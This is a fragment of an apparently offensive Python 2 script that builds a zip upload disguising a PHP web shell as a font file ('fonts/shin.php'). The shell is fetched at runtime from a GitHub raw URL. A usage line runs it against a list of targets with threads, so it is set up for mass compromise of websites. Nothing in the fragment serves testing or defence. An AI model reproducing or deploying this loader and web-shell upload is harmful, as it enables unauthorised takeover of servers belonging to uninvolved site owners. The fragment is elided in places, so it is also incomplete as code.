...
?>".file_get_contents/*******/("https://raw.githubusercontent.com/adenxploit/bypshell/refs/heads/main/geco.php"));/**/?>'''
    #shell_bytes = acumalaka.encode('utf-8')
    ...
    #z.writestr("fonts/shin.PHP", shell_bytess)
    #z.writestr("fonts/shin.php", accu_l)
...
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print "Usage: python2 %s list.txt [threads=5]" % sys.argv[0]
        sys.exit(1)
